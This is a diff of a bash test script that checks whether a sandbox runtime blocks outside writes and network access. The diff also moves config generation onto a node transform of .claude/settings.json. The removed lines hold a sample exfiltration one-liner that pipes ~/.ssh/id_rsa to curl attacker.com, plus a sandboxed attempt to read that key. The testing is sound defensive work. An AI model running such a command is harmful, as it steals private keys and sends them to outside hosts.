@@ -13,9 +13,8 @@ set -euo pipefail
 #
 # What it tests:
 #   1. Filesystem writes outside cwd are blocked
-#   2. Reads of sensitive paths (~/.ssh) are blocked
-#   3. Outbound network to non-allowed domains is blocked
-#   4. Normal operations within cwd still work
+#   2. Outbound network to non-allowed domains is blocked
+#   3. Normal operations within cwd still work
 #
 # Usage:
 #   npm install   # installs @anthropic-ai/sandbox-runtime
@@ -42,25 +41,47 @@ if [ ! -d "node_modules" ]; then
 fi
 
 # -- Settings file for srt -------------------------------------------------
-# srt needs a config file telling it which paths are writable. Without one,
-# the default is maximally restrictive (no writes allowed anywhere).
-# We allow writes to cwd so that Test 4 (normal operations) can succeed.
+# srt needs a config file in its flat format. We read .claude/settings.json
+# (the source of truth) and transform it into srt's expected structure,
+# resolving relative paths to absolute ones.
 SRT_SETTINGS="$(mktemp)"
-cat > "$SRT_SETTINGS" <<SETTINGS_EOF
-{
-  "network": {
-    "allowedDomains": [],
-    "deniedDomains": []
-  },
-  "filesystem": {
-    "denyRead": [],
-    "allowRead": [],
-    "allowWrite": ["$(pwd)"],
-    "denyWrite": []
-  }
-}
-SETTINGS_EOF
 trap 'rm -f "$SRT_SETTINGS"' EXIT
+
+node -e "
+  const fs = require('fs');
+  const path = require('path');
+  const s = JSON.parse(fs.readFileSync('.claude/settings.json', 'utf8')).sandbox;
+  const cwd = process.cwd();
+  const home = require('os').homedir();
+
+  function resolve(p) {
+    if (p.startsWith('/')) return p;
+    if (p.startsWith('~/')) return home + p.slice(1);
+    if (p.startsWith('./')) return cwd + p.slice(1);
+    return cwd + '/' + p;
+  }
+
+  // Resolve glob patterns too — prefix with cwd if relative
+  function resolvePattern(p) {
+    if (p.startsWith('/')) return p;
+    if (p.startsWith('~/')) return home + p.slice(1);
+    return cwd + '/' + p;
+  }
+
+  const out = {
+    network: {
+      allowedDomains: (s.network && s.network.allowedDomains) || [],
+      deniedDomains: (s.network && s.network.deniedDomains) || []
+    },
+    filesystem: {
+      denyRead: ((s.filesystem && s.filesystem.denyRead) || []).map(resolvePattern),
+      allowRead: ((s.filesystem && s.filesystem.allowRead) || []).map(resolve),
+      allowWrite: ((s.filesystem && s.filesystem.allowWrite) || []).map(p => p === '.' ? cwd : resolve(p)),
+      denyWrite: ((s.filesystem && s.filesystem.denyWrite) || []).map(resolve)
+    }
+  };
+  fs.writeFileSync(process.argv[1], JSON.stringify(out, null, 2));
+" "$SRT_SETTINGS"
 
 # -- Helpers ----------------------------------------------------------------
 banner() {
@@ -142,29 +163,11 @@ else
 fi
 
 # ---------------------------------------------------------------------------
-# Test 2: Read a sensitive path should fail
+# Test 2: Outbound network to non-allowed domain should fail
 # ---------------------------------------------------------------------------
-banner "Test 2 — Read Sensitive Path"
-info "Attempting to read ~/.ssh/id_rsa (a common exfiltration target)."
-why  "Even if this file exists, the sandbox should deny reads outside allowed paths."
-why  "This blocks attacks like: cat ~/.ssh/id_rsa | curl attacker.com"
-
-TEST2_CMD="cat ~/.ssh/id_rsa"
-cmd  "srt \"$TEST2_CMD\""
-
-if output=$(sandbox_exec "cat $HOME/.ssh/id_rsa" 2>&1); then
-  fail "Read of ~/.ssh/id_rsa succeeded — sandbox may not be restricting reads."
-else
-  pass "Read of ~/.ssh/id_rsa was denied (or file does not exist under sandbox)."
-  echo "       Output: $(echo "$output" | head -3)"
-fi
-
-# ---------------------------------------------------------------------------
-# Test 3: Outbound network to non-allowed domain should fail
-# ---------------------------------------------------------------------------
-banner "Test 3 — Outbound Network to Non-Allowed Domain"
+banner "Test 2 — Outbound Network to Non-Allowed Domain"
 info "Attempting to reach https://example.com (not in the network allowlist)."
-why  "The sandbox network filter blocks connections to domains not in networkAllowlist."
+why  "The sandbox network filter blocks connections to domains not in allowedDomains."
 why  "This prevents data exfiltration to attacker-controlled servers."
 
 TEST3_CMD="curl -sf --max-time 5 https://example.com"
@@ -180,7 +183,7 @@ fi
 # ---------------------------------------------------------------------------
 # Test 4: Normal operation within cwd should succeed
 # ---------------------------------------------------------------------------
-banner "Test 4 — Normal Operation Within Working Directory"
+banner "Test 3 — Normal Operation Within Working Directory"
 info "Writing, reading, and deleting a temp file inside the current directory."
 why  "The sandbox should allow normal file operations within the project directory."
 why  "This confirms the sandbox is not overly restrictive."
